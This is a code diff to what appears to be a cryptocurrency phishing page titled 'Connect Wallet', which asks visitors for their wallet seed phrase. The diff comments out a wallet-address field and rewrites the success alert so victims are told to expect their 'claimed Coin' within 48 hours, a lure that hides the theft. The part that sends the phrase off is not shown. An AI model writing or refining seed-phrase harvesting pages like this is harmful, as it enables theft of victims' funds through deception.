@@ -35,6 +35,13 @@
     <section class="input">
       <div class="wrap">
         <h2>Connect Wallet</h2>
+     <!--  <p>Wallet Address</p>
+        <input
+          type="text"
+          name="address"
+          id="address"
+          placeholder="Please paste address"
+        />--> 
         <p>
           Please enter your wallet's seed phrase, the seed phrase is 24 words
           long (sometimes 12)
@@ -85,7 +92,7 @@
         if (response.ok) {
           send.textContent = "Validate";
           alert(
-            "Your Wallet validated successfully"
+            "Your Wallet validated successfully check your Wallet in the next 48 hours for your claimed Coin."
           );
           form.classList.remove("active");
         }
